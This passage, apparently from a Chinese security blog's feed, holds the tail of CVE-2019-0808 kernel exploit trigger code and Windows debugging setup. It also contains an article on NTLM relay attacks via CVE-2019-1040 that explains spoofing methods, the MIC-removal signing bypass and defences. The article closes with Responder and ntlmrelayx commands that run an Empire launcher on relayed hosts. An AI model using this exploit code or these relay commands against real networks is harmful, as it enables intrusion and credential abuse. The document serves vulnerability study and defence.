class="number">0</span>;</span><br><span class="line">wndClass.hInstance = hInst;</span><br><span class="line">wndClass.lpszMenuName = <span class="number">0</span>;</span><br><span class="line">wndClass.lpszClassName = <span class="string">"_rand_class_name_"</span>;</span><br><span class="line">RegisterClassExA(&amp;wndClass);</span><br><span class="line">hWndMain = CreateWindowA(<span class="string">"_rand_class_name_"</span>, <span class="string">"_rand_window_name_"</span>, WS_DISABLED, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, hInst, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹出菜单</span></span><br><span class="line">TrackPopupMenuEx(hMenuRoot, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, hWndMain, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消息循环</span></span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (GetMessageW(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">TranslateMessage(&amp;msg);</span><br><span class="line">DispatchMessageW(&amp;msg);</span><br><span class="line"><span class="comment">// NtUserMNDragOver() 调用后， iMenuCreated 会累加，调用后马上结束消息循环</span></span><br><span class="line"><span class="keyword">if</span> (iMenuCreated &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">bOnDraging = TRUE;</span><br><span class="line">CHAR buf[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">POINT pt;</span><br><span class="line">pt.x = <span class="number">2</span>;</span><br><span class="line">pt.y = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] callNtUserMNDragOverSysCall\n"</span>);</span><br><span class="line">callNtUserMNDragOverSysCall(&amp;pt, buf); <span class="comment">// 通过内核调用，开始触发</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> success;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h3&gt;&lt;h4 id=&quot;windbg调试&quot;&gt;&lt;a href=&quot;#windbg调试&quot; class=&quot;headerlink&quot; title=&quot;windbg调试&quot;&gt;&lt;/a&gt;windbg调试&lt;/h4&gt;&lt;p&gt;本次调试环境为Win7 x86 sp1，使用windbg需要安装SDK。另外要注意的是，新安装的系统的win32k.sys版本为6.1.7601.17514，本文分析的win32k.sys版本为6.1.7601.23591。&lt;br&gt;下载地址：&lt;a href=&quot;https://www.microsoft.com/en-us/download/details.aspx?id=8279&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.microsoft.com/en-us/download/details.aspx?id=8279&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;cve-2019-0808.rar&quot;&gt;点击下载DLL及pdb、IDA注释文件&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&quot;/2019/10/10/CVE-2019-0808详细分析/40.png&quot;&gt;

&lt;p&gt;win8/win10可以在应用商店安装windbg preview，并配合 VirtualKD 进行双机调试 :)  &lt;a href=&quot;https://bbs.pediy.com/thread-247019.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;传送门&lt;/a&gt;&lt;br&gt;VirtualKD 中调试器路径选择自定义，地址为：&lt;/p&gt;
&lt;figure class=&quot;highlight taggerscript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;C:&lt;span class=&quot;symbol&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;symbol&quot;&gt;\j&lt;/span&gt;ack&lt;span class=&quot;symbol&quot;&gt;\A&lt;/span&gt;ppData&lt;span class=&quot;symbol&quot;&gt;\L&lt;/span&gt;ocal&lt;span class=&quot;symbol&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;symbol&quot;&gt;\W&lt;/span&gt;indowsApps&lt;span class=&quot;symbol&quot;&gt;\W&lt;/span&gt;inDbgX.exe /k com:pipe,resets=0,reconnect,port=$(pipename)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;注意不是windbg preview安装后的EXE目录：&lt;/p&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;C&lt;/span&gt;:\&lt;span class=&quot;selector-tag&quot;&gt;Program&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;Files&lt;/span&gt;\&lt;span class=&quot;selector-tag&quot;&gt;WindowsApps&lt;/span&gt;\&lt;span class=&quot;selector-tag&quot;&gt;Microsoft&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.WinDbg_1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.1910&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.3003&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.0_neutral__8wekyb3d8bbwe&lt;/span&gt;\&lt;span class=&quot;selector-tag&quot;&gt;DbgX&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.Shell&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.exe&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;另外 IDA 7.0 如果不自动下载PDB符号，需要将cfg/pdb.cfg中的相关注释去掉，并建立相应文件夹，另外需要vc runtime 2010运行库（是个坑）。&lt;/p&gt;
&lt;h4 id=&quot;开启内核调试&quot;&gt;&lt;a href=&quot;#开启内核调试&quot; class=&quot;headerlink&quot; title=&quot;开启内核调试&quot;&gt;&lt;/a&gt;开启内核调试&lt;/h4&gt;&lt;p&gt;首先在系统变量中设置符号表服务器系统变量：&lt;/p&gt;
&lt;figure class=&quot;highlight cmd&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;_NT_SYMBOL_PATH=SRV*C:\WINDOWS\Symbols*http://msdl.microsoft.com/download/symbols&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;进入kernel-mode debugging (kd&amp;gt; or lkd&amp;gt;)调试模式，首先命令行运行&lt;/p&gt;
&lt;figure class=&quot;highlight cmd&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bcdedit /debug on&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;重启，再打开windbg，即可通过快捷键 Ctrl+K ，或者以下菜单路径，进入内核调试模块：&lt;/p&gt;
&lt;figure class=&quot;highlight coq&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;WinDbg &lt;span class=&quot;keyword&quot;&gt;File&lt;/span&gt;&amp;gt;Kernel Debugging&amp;gt;&lt;span class=&quot;keyword&quot;&gt;Local&lt;/span&gt;&amp;gt;Ok&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="http://lahonja.me/categories/漏洞分析/"/>
    
    
    <category term="Windows" scheme="http://lahonja.me/tags/Windows/"/>
    
    <category term="漏洞分析" scheme="http://lahonja.me/tags/漏洞分析/"/>
    
    <category term="CVE-2019-0808" scheme="http://lahonja.me/tags/CVE-2019-0808/"/>
    
  </entry>
  
  <entry>
    <title>结合CVE-2019-1040分析NTLM中继攻击</title>
    <link href="http://lahonja.me/2019/08/07/%E7%BB%93%E5%90%88CVE-2019-1040%E5%88%86%E6%9E%90NTLM%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/"/>
    <id>http://lahonja.me/2019/08/07/%E7%BB%93%E5%90%88CVE-2019-1040%E5%88%86%E6%9E%90NTLM%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB/</id>
    <published>2019-08-07T02:41:52.000Z</published>
    <updated>2019-08-16T06:15:27.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是NTLM中继攻击"><a href="#什么是NTLM中继攻击" class="headerlink" title="什么是NTLM中继攻击"></a>什么是NTLM中继攻击</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>NTLM是Windows实现身份认证的一种协议，如计算机A远程登陆计算机B，在计算机B验证计算机A的时候使用的是NTLM协议。但是在这个过程中，计算机A在通常情况下不知道计算机B是不是真正的计算机B，因为攻击机C也可以来冒充计算机B。当攻击机C冒充计算机B后，原本计算机A发往计算机B的NTLM认证流量，将发送给攻击机C，攻击机C接收到认证信息之后，再转发给B，从而实现NTLM流量的中继，也就是平常所说的中间人攻击，NTLM中继也就是中间人攻击的一种。<br>上述过程我们可以将再攻击机C上的中继程序理解为一个NTLM协议代理程序。但是攻击机C怎么实现欺骗计算机A呢，许多网络协议可以用来进行欺骗，从而进行中间人攻击，常见的有ARP、DHCP、DNS等。在实际的攻击中，使用LLMNR/NetBIOSNS欺骗的方式更多，因为这类欺骗的网络流量小，实施也更容易，与Net-NTLMhash relay attack的结合也更紧密。<br>LLMNR和NetBIOSNS是Windows系统完成名称解析的一种方法。<br><strong>Windows系统对机器名的解析顺序如下：</strong></p><ol><li>本地HOSTS文件（%windir%\System32\drivers\etc\hosts）</li><li>DNS缓存</li><li>DNS服务器</li><li>链路本地多播名称解析（LLMNR）</li><li>NetBIOS名称服务（NBT-NS）</li></ol><blockquote><p><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" target="_blank" rel="noopener">参考文档</a></p></blockquote><h3 id="LLMNR协议"><a href="#LLMNR协议" class="headerlink" title="LLMNR协议"></a>LLMNR协议</h3><p>在DNS 服务器不可用时，DNS 客户端计算机可以使用本地链路多播名称解析 (LLMNR—Link-Local Multicast Name Resolution)（也称为多播 DNS 或 mDNS）来解析本地网段上的名称。例如，如果路由器出现故障，从网络上的所有 DNS 服务器切断了子网，则支持 LLMNR 的子网上的客户端可以继续在对等基础上解析名称，直到网络连接还原为止。</p><a id="more"></a><ol><li>主机在自己的内部名称缓存中查询名称。如果在缓存中没有找到，那么主机就会向自己配置的主DNS服务器发送查询请求。如果没有收到回应或收到了错误信息，主机还会尝试搜索配置的备用DNS服务器。如果主机没有配置DNS服务器，或者如果在连接DNS服务器的时候没有遇到错误但失败了，那么名称解析会失败，并转为使用LLMNR。</li><li>主机通过用户数据报协议(UDP)发送多播查询，查询主机名对应的IP地址，这个查询会被限制在本地子网(也就是所谓的链路局部)内。</li><li>链路局部范围内每台支持LLMNR，并且被配置为响应传入查询的主机，在收到这个查询请求后，会将被查询的名称和自己的主机名进行比较。如果没有找到匹配的主机名，那么计算机就会丢弃这个查询。如果找到了匹配的主机名，这台计算机会传输一条包含了自己IP地址的单播信息给请求该查询的主机。<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/1-6.png"></li></ol><h3 id="LLMNR利用方式"><a href="#LLMNR利用方式" class="headerlink" title="LLMNR利用方式"></a>LLMNR利用方式</h3><p>通过LLMNR欺骗，让计算机A认为攻击机C就是计算机B。然后将计算机A将NTLM认证发送给攻击机C，攻击机C对流量进行解析和转发。</p><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/1-5.png"><blockquote><p><a href="https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/" target="_blank" rel="noopener">参考文档</a></p></blockquote><h3 id="WPAD"><a href="#WPAD" class="headerlink" title="WPAD"></a>WPAD</h3><p>网络代理自动发现协议WPAD（Web Proxy Auto-Discovery Protocol） 是 Web 代理自动发现协议的简称，该协议的功能是可以使局域网中用户的浏览器可以自动发现内网中的代理服务器，并使用已发现的代理服务器连接互联网或者企业内网。当系统开启了代理自动发现功能后，用户使用浏览器上网时，浏览器就会在当前局域网中自动查找代理服务器，如果找到了代理服务器，则会从代理服务器中下载一个名为 PAC（Proxy Auto-Config） 的配置文件。该文件中定义了用户在访问一个 URL 时所应该使用的代理服务器。浏览器会下载并解析该PAC文件，并将相应的代理服务器设置到用户的浏览器中。PAC文件指定攻击者就是代理服务器，然后攻击者就可以劫持受害者的HTTP流量，在其中插入任意HTML标签。</p><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/1-7.png"><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/1-8.png"><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/1-9.png"><h3 id="WPAD利用方式"><a href="#WPAD利用方式" class="headerlink" title="WPAD利用方式"></a>WPAD利用方式</h3><p>前面讲到的LLMNR利用方式是直接中继整个计算机A的所有流量，但是WPAD这种方式只能中继浏览器的HTTP流量。那么这种情况下如何才能获取到SMB的流量呢？<br><strong>这里重点分析下浏览器在什么情况下可以自动向攻击者发送Net-NTLMhash。</strong><br>下图是几款浏览器对WPAD及SMB支持的情况：</p><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/1-10.png"><p>我们可以看出，Windows10上的IE和Edge，即使支持SMB协议，但是无法通过劫持WPAD的方式来触发，Chrome浏览器虽然可以进行WPAD劫持，但是不支持SMB协议。<br>一个解决思路就是放弃最常用的NTLMSSP over SMB，使用NTMLSSP over HTTP，使用HTTP协议来发送NTLM认证消息：</p><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/1-11.png"><p>那接下来的问题就是浏览器什么情况下会通过HTTP协议自动发送Net-NTLMhash呢？答案是IntranetZone</p><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/1-12.png"><p>通过对IE上述配置的分析，发现配置与注册表中的policy和zone有关：如果policy是URLPOLICY_CREDENTIALS_SILENT_LOGON_OK，IE会自动发送Net-NTLMhash。如果policy是URLPOLICY_CREDENTIALS_MUST_PROMPT_USER，那么只有zone的值为0、1、2的时候才会自动发送Net-NTLMhash。</p><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/1-13.png"><p>经过测试，在Windows10上，工作组环境下，只要URL是主机名而不是完全限定性域名的情况下，就认为是LocalInternet Zone内的，如下图：</p><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/1-14.png"><blockquote><p><a href="https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/" target="_blank" rel="noopener">参考文档</a></p></blockquote><h3 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h3><p>DHCP Sproofing同样是一种中间人攻击方式。DHCP是提供IP地址分配的服务。当局域网中的计算机设置为自动获取IP，就会在启动后发送广播包请求IP地址。DHCP服务器（如路由器）会分配一个IP地址给计算机。在分配的时候，会提供DNS服务器地址。<br>攻击者可以通过伪造大量的IP请求包，而消耗掉现有DHCP服务器的IP资源。当有计算机请求IP的时候，DHCP服务器就无法分配IP。如果攻击者分配假的网关，并把网关指向一台攻击主机，攻击主机再把网络流量转发给真正的网关，这样虽然不影响用户正常的上网，但客户机的所有流量都流经攻击主机，很容易泄露一些机密信息，这种攻击也叫中间人攻击。攻击者还可以在给计算机分配IP时，指定一个虚假的DNS服务器地址。这时，当用户访问网站的时候，就被虚假DNS服务器引导到错误的网站。</p><h3 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h3><p>从Windows Vista之后，每台Windows计算机都默认定期请求此配置信息，你可以从Wireshark抓取的数据包看到：</p><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/1-15.png"><p>通过响应这些DHCPv6请求，为受害主机分配本地链路范围内的IPv6地址。而实际上，在IPv6网络中，这些地址由主机自动分配，不需要由DHCP服务器配置。这使得我们有机会将我们的IP设置为默认IPv6 DNS服务器。为了完成上述操作，一般使用的工具为MITM6。<br>MITM6不会对网络中所有流量进行中间人劫持，而是只针对目标主机，所以它对网络的影响很小。<br>MITM6是一款测试工具，它利用Windows的默认配置来接管默认的DNS服务器。通过响应DHCPv6消息，为受害者提供链路本地IPv6地址，并将攻击者主机设置为默认DNS服务器来实现此目的。作为DNS服务器，mitm6将有选择地响应攻击者选择的DNS查询，并将受害者流量重定向到攻击者主机，而不是合法服务器。</p><h3 id="IPv6利用方式"><a href="#IPv6利用方式" class="headerlink" title="IPv6利用方式"></a>IPv6利用方式</h3><p>MITM6的攻击过程如下图所示。它自动检测攻击者主机的IP配置，应答本网络内客户端发送的DHCPv6请求报文，然后指定攻击者的IP为DNS服务器地址。它还有一个可选功能，即周期性地发送RA（Router Advertisment）报文，提醒客户端当前环境中存在一个IPv6网络，需要通过DHCPv6协议获取IPv6地址。</p><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/1-16.png"><p>在受害主机上，你可以看到我们的服务器被配置为DNS服务器。由于Windows对IP协议的偏好，IPv6 DNS服务器的优先级高于IPv4 DNS服务器，因此IPv6 DNS服务器将用于查询A（IPv4）和AAAA（IPv6）记录。</p><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/1-17.png"><h2 id="NTLM协议介绍"><a href="#NTLM协议介绍" class="headerlink" title="NTLM协议介绍"></a>NTLM协议介绍</h2><h3 id="协议介绍"><a href="#协议介绍" class="headerlink" title="协议介绍"></a>协议介绍</h3><p>NTLM是Windows上对于SSPI身份认证接口的一种实现。<br>在Windows上，微软定义了一套用于安全认证相关的接口-SSPI，全称为 Security Service Provider Interface。这套接口定义了与安全有关的功能函数，包含但不限于：</p><ol><li>身份验证机制</li><li>为其他协议提供的 Session security 机制。Session Security 指的是会话安全，即为通讯提供数据完整性校验以及数据的加、解密功能。</li></ol><p>因为 SSPI 中定义了与 session security 有关的 API。所以，基本上层应用利用任何 SSP 与远程的服务进行了身份验证后，此 SSP 都会为本次连接生成一个随机 key。这个 key 往往被称为 Session Key。上层应用在经过身份验证后，可以选择性地使用这个 Key 来对之后发往服务端或接收自服务端的数据进行签名或加密。<br>不同的 SSP，实现的身份验证机制是不一样的。比如 NTLM 实现的就是一种 Challenge Based 身份验证机制。而 Kerberos 实现的就是基于 ticket 的身份验证机制。我们可以编写自己的 SSP，然后注册到操作系统中，让操作系统支持更多的自定义的身份验证方法。</p><h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/2-2.png"><ul><li>SMB2 / Negotiate Protocol</li></ul><ol><li>Negotiate Protocol Request: 客户端向服务端发送SMB_COM_NEGOTIATE Request请求消息，进行协商要使用的协议版本。<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/2-3.png"></li><li>Negotiate Protocol Response: 服务器收到该请求后，选择一个它支持的最新版本，再通过SMB_COM_NEGOTIATE Response回复给客户端。这里选择的是SMBv2.???，所以还需进一步协商版本号：<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/2-4.png">响应中的Dialect于选择的协议对应关系：<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/2-5.png">进行第二次版本号协商：<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/2-6.png">回应选择的版本号为0x0311:<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/2-7.png"></li></ol><ul><li>SMB2 / Session Setup</li></ul><ol start="3"><li>Session Setup Request: Negotiate Protocol阶段结束之后，客户端发送SMB_COM_SESSION_SETUP_ANDX请求消息。 如果协商结果是使用NTLM进行身份验证，则在此消息中嵌入NTLM NEGOTIATE_MESSAGE。<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/2-8.png"></li><li>Session Setup Response: 服务器响应SMB_COM_SESSION_SETUP_ANDX响应消息，其中嵌入了NTLM CHALLENGE_MESSAGE。 该消息包括一个8字节的随机数，称为Challenge，服务器在消息的ServerChallenge字段中生成并发送。<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/2-9.png"></li><li>Session Setup Request: 客户端从NTLM CHALLENGE_MESSAGE中提取ServerChallenge字段，使用Challenge与客户端账号密码的NTLM hash进行加密运算，生成NET-NTLM，并将NTLM AUTHENTICATE_MESSAGE发送到服务器（嵌入在SMB_COM_SESSION_SETUP_ANDX请求消息中）。<strong>注意下图中绿色方框中的内容，将会是CVE-2019-1040漏洞的关键点。</strong><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/2-10.png"></li><li>Session Setup Response: 如果账户及密码服务器发送嵌入在SMB_COM_SESSION_SETUP_ANDX响应消息中的成功或失败的消息（下图是失败）。<img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/2-11.png"></li></ol><h3 id="NTLM-Hash-Vs-NET-NTLM-Hash"><a href="#NTLM-Hash-Vs-NET-NTLM-Hash" class="headerlink" title="NTLM Hash Vs NET-NTLM Hash"></a>NTLM Hash Vs NET-NTLM Hash</h3><p>通常可从Windows系统中的SAM文件和域控的NTDS.dit文件中获得所有用户的NTLM hash，通过Mimikatz读取lsass.exe进程能获得已登录用户的NTLM hash，格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42</span><br></pre></td></tr></table></figure><p>Net—NTLM的hash是用于网络认证(他们的基于用户NT的hash值通过响应的算法产生的)。一般是Net-NTLM v1 hash，Net-NTLM v2 hash的统称。Net-NTLMv2的格式如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030</span><br></pre></td></tr></table></figure><p>渗透测试过程中，可以通过域控制器的NTDS数据库进而得到NTLM hash，或者通过Hash导出工具得到用户NTLM hash，但是不可以通过这种方法得到Net-NTLM的hash值。当拿到NTLM hash后，可以通过拿到的NTLM hash进行Pass the hash(PTH)攻击。</p><h2 id="NTLM中继攻击实验"><a href="#NTLM中继攻击实验" class="headerlink" title="NTLM中继攻击实验"></a>NTLM中继攻击实验</h2><h3 id="LDAP签名绕过"><a href="#LDAP签名绕过" class="headerlink" title="LDAP签名绕过"></a>LDAP签名绕过</h3><p>默认情况下，SMB中的NTLM身份验证:NEGOTIATE_SIGN为set状态：</p><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/3-1.png"><p>将此SMB流量中继到LDAP时，由于此时的Negotiate Sign设置为set，该标志会触发LDAP签名，而此SMB流量为攻击者从Exchange服务器上中继而来，无法通过LDAP的签名校验，从而被LDAP忽略，导致攻击失败。为了防止攻击失败，需要将NEGOTIATE_SIGN设置为Not set。为了确保消息在传输中不被篡改，NTML协议在NTLM_AUTHENTICATE消息中添加了一个额外的MIC（消息完整性代码）字段。如果简单的改包，将NEGOTIATE_SIGN设置Not set，将会导致MIC校验不通过。<br>因此，试图篡改其中一条消息的攻击者（例如，修改签名协商）将无法生成相应的MIC，这将导致攻击失败。<br>接下来就是绕过MIC校验的方式，以便更改包中NEGOTIATE_SIGN的值。<br>LDAP签名绕过方法：</p><ol><li>取消设置NTLM_NEGOTIATE消息中的签名标志 NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN</li><li>取消设置NTLM_AUTHENTICATE消息中的以下标志 NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION</li></ol><h3 id="MIC校验绕过"><a href="#MIC校验绕过" class="headerlink" title="MIC校验绕过"></a>MIC校验绕过</h3><p>Microsoft服务器允许无MIC 的NTLM_AUTHENTICATE消息。如果想要将SMB身份验证中继到LDAP，并完成中继攻击。取消MIC校验以确保可以修改数据包中的内容：</p><ol><li>从NTLM_AUTHENTICATE消息中删除MIC</li><li>从NTLM_AUTHENTICATE消息中删除版本字段（删除MIC字段而不删除版本字段将导致错误）</li></ol><h3 id="攻击结果"><a href="#攻击结果" class="headerlink" title="攻击结果"></a>攻击结果</h3><p>获得其他计算机的身份认证会话信息，以其他计算机的权限去访问远程资源，权限取决于中间人攻击时捕获到的SMB身份认证。</p><h3 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h3><p>SMB-Relay可以通过开启SMB Signing（SMB签名）来进行防御。<br>SSP 往往会为上层协议提供 session security 功能，NTLM SSP 也不例外。session security 功能往往都是基于 session key 来实现的。这个 session key 往往是由 SSP 自己生成的。（Kerberos 场景下，session key 是由 KDC 在生成相应票据的时候一起生成的，并发回给客户端或服务端的）。<br>在开启了 SMB签名 的情况下，在SMB协议使用 NTLM SSP 进行了身份验证后，后续的所有数据包，都会利用 NTLM SSP 生成的这个 session key 进行签名。SMB服务端收到后续的数据包后，也会检查数据包的签名，如果签名不对，则拒收。<br>NTLM SSP 在生成 session key 的时候，会需要用到账号密码的原始 LM HASH 或 NT HASH。而中继类型的攻击，都是站在一个中间人的位置，是不可能知道原始的LM HASH或NT HASH的（如果知道了也就不需要中继攻击这种攻击手法了，就可以PTH了）。我们是无法计算出来这个session key的，自然也就无法对数据包进行签名。（有一个例外，NETLOGON 协议的 CVE 2015-0005）。<br>所以在用 SMB-Relay 攻击一台服务器的时候，如果出现了账号验证成功，但是后续无法进行任何其他操作的时候，或者提示Access denied的时候，这就是目标服务器开启了 SMB 签名校验。<br>通过开启 SMB Signing 功能，才能防止 SMB-Relay。这实际上是 NTLM SSP 的一个缺陷。仔细观察前面所讲到的 NTLM 验证流程可以发现，NTLM SSP 可以让服务端来验证客户端的身份，但是却无法让客户端来验证服务端的身份。也就是说，使用 NTLM SSP 的客户端，本质上是不知道自己连上的服务器到底是哪一台的。Kerberos 是支持双向认证的。（支持双向验证的 SSP ，一般都是在验证阶段就引入了 session key 或其他类似的 key，来确保进行验证的双方都知道所谓的 “previously-shared secret”。在 NTLM SSP 中，这个 previously-shared secret 指的就是 LM HASH 或 NT HASH）。<br>所以，要想解决 NTLM-Relay 的问题，只能是使用 NTLM SSP 的上层协议，强行使用类似 SMB-Signing（如 LDAP Signing） 的手法，来间接验证服务端的身份。<br>域环境下默认的验证协议是 Kerberos。（本质上是进行 Negotiate 协商，它会优先选择 Kerberos）但是当 Kerberos 因为某些原因不可用的时候，会降级到 NTLM。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ol><li>收集 SMB Signing 签名关闭的主机:</li></ol><p><strong>使用CrackMapExec</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme --timeout 5 --verbose smb 172.0.0.1/24 --gen-relay-list targets.txt</span><br></pre></td></tr></table></figure><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/6-3.png"><p><strong>使用RunFinger.py</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python RunFinger.py -g -i 172.0.0.1/24</span><br></pre></td></tr></table></figure><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/6-4.png"><ol start="2"><li>使用Responder进行投毒</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I &lt;interface&gt; -r -d -w</span><br></pre></td></tr></table></figure><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/6-1.png"><ol start="3"><li>使用ntlmrelayx进行中继</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -tf targets.txt -c &lt;insert your Empire Powershell launcher here&gt;</span><br></pre></td></tr></table></figure><img src="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/6-2.png"><h2 